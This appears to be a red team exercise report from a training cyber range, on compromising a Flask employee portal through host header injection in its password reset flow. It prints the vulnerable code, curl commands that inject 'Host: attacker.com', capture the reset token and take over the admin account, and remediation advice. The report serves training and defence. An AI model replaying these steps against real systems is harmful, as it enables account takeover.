# Red Team Engagement Report
**Classification:** RESTRICTED — White Team / Exercise Controller Only
**Report ID:** RED-REPORT-IT01-M01
**Version:** 1.0
**Date:** [Date of Exercise]
**Operator:** [Red Team Operator Name / Handle]
**Range:** RNG-IT-01 · Corporate Gateway
**Machine:** M1 — itgw-webportal

---

## 1. Engagement Summary

| Field | Detail |
|---|---|
| Target | Prabal Urja Limited Employee Self-Service Portal |
| Target IP | `203.x.x.x` |
| Target Port | `8080` (HTTP) |
| Attack Class | Web Application — Host Header Injection |
| Objective | Gain admin-level authenticated session; extract mail relay pivot artifact |
| Outcome | **SUCCESSFUL** — Admin account compromised; M2 pivot artifact obtained |
| Time to Compromise | `[HH:MM]` from exercise start |

---

## 2. Pre-Engagement Reconnaissance

**Passive Recon:**
- Target identified as a Flask-based web portal via HTTP response headers (`Server: Werkzeug`).
- Login page revealed employee email domain: `@prabalurja.in`.
- `/forgot-password` endpoint identified via manual browsing — unauthenticated, standard form.
- No rate-limiting observed on the reset endpoint.
- No CAPTCHA or multi-factor controls present.

**Port Scan:**
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 2.3.7 (Python 3.10.x)
```

**HTTP Fingerprinting:**
```bash
curl -I http://203.x.x.x:8080/
# Response: Server: Werkzeug/2.3.7 Python/3.10.x
# Set-Cookie: session=...; HttpOnly; Path=/
```

---

## 3. Vulnerability Analysis

**Vulnerability:** HTTP Host Header Injection in Password Reset Flow

**Root Cause:** The application retrieves the `Host` header directly from the incoming request and uses it verbatim to construct the password reset URL:

```python
host = request.headers.get('Host', request.host)
reset_url = f"http://{host}/reset-password?token={token}"
```

No validation, whitelist check, or server-side canonical hostname configuration is applied.

**Impact Chain:**
1. Attacker controls the domain embedded in the reset URL.
2. Application reflects the full reset URL (including token) in the HTTP response — no email delivery is required to capture the token.
3. Token is valid and usable on the actual server regardless of the manipulated domain.
4. Any registered email address can be targeted, including `admin@prabalurja.in`.

**CVSS v3.1 Base Score (Operator Assessment):** `8.1 HIGH`

---

## 4. Attack Narrative & Timeline

| Step | Time | Action | Outcome |
|---|---|---|---|
| 1 | T+00:00 | Service discovery on 203.x.x.x:8080 | Flask portal confirmed |
| 2 | T+00:03 | Manual browsing — mapped application routes | `/forgot-password` identified |
| 3 | T+00:07 | Test POST to `/forgot-password` with standard Host | Reset URL reflected in response |
| 4 | T+00:09 | POST to `/forgot-password` with `Host: attacker.com` | Reset URL with attacker domain returned |
| 5 | T+00:10 | Token extracted from response body | Valid token captured |
| 6 | T+00:11 | POST to `/reset-password` with token + new password | Password reset confirmed |
| 7 | T+00:12 | POST to `/login` with `admin@prabalurja.in` + new password | Admin session established |
| 8 | T+00:13 | Admin dashboard accessed — infra panel reviewed | Mail relay `203.x.x.x:25` documented |

---

## 5. Commands Executed

```bash
# Step 3 — Baseline test
curl -s -X POST http://203.x.x.x:8080/forgot-password \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=admin@prabalurja.in"

# Step 4 — Host Header Injection
curl -s -X POST http://203.x.x.x:8080/forgot-password \
  -H "Host: attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=admin@prabalurja.in"

# Step 6 — Password reset with captured token
curl -s -X POST "http://203.x.x.x:8080/reset-password" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "token=<CAPTURED_TOKEN>&new_password=Operator@99!"

# Step 7 — Login as admin
curl -s -c /tmp/pul_cookies.txt -X POST http://203.x.x.x:8080/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=admin@prabalurja.in&password=Operator@99!"

# Step 8 — Access dashboard
curl -s -b /tmp/pul_cookies.txt http://203.x.x.x:8080/dashboard
```

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique | Sub-Technique | ID | Notes |
|---|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | — | T1190 | Unauthenticated exploit of /forgot-password |
| Credential Access | Steal or Forge Auth Certificates | — | T1649 | Reset token captured via reflected response |
| Privilege Escalation | Valid Accounts | Local Accounts | T1078.003 | Admin role obtained via password reset |
| Discovery | System Information Discovery | — | T1082 | Admin panel surveyed for infra topology |
| Collection | Data from Local System | — | T1005 | Mail relay host/port extracted from dashboard |

---

## 7. Pivot Artifact Obtained

| Artifact | Value |
|---|---|
| Mail Relay Host | `203.x.x.x` |
| Mail Relay Port | `25` |
| Auth Requirement | None (v-Public subnet trusted) |
| Next Target | M2 — itgw-mailrelay |

---

## 8. Evidence & Screenshots

> **[Attach: Terminal screenshot — curl command with Host: attacker.com]**

> **[Attach: Terminal screenshot — response body showing reflected reset URL with attacker domain and token]**

> **[Attach: Terminal screenshot — successful password reset confirmation]**

> **[Attach: Browser/curl screenshot — admin dashboard with IT Infrastructure panel showing mail relay details]**

---

## 9. Operational Security Notes

- No payloads dropped on target system.
- No persistence mechanisms installed.
- Attack surface: unauthenticated HTTP endpoint only.
- No lateral movement performed (beyond reading dashboard — staying within M1 scope).
- All commands executed from operator workstation on v-Public segment.

---

## 10. Recommendations (for White Team Debrief)

- Application must use `app.config['SERVER_NAME']` or a hardcoded `BASE_URL` — never derive from `Host` header.
- Reset tokens must be single-use and expire within a short window (15 minutes max).
- Admin dashboards must not expose raw network topology — implement need-to-know role controls.
- Enforce HTTPS on all v-Public endpoints — prevents token interception by passive observers.
- Rate-limit `/forgot-password`: maximum 3 requests per IP per 10-minute window.

---

**Report Prepared By:** [Red Team Operator]
**White Team Review:** [Exercise Controller]
**Classification:** RESTRICTED — Authorised Reviewers Only
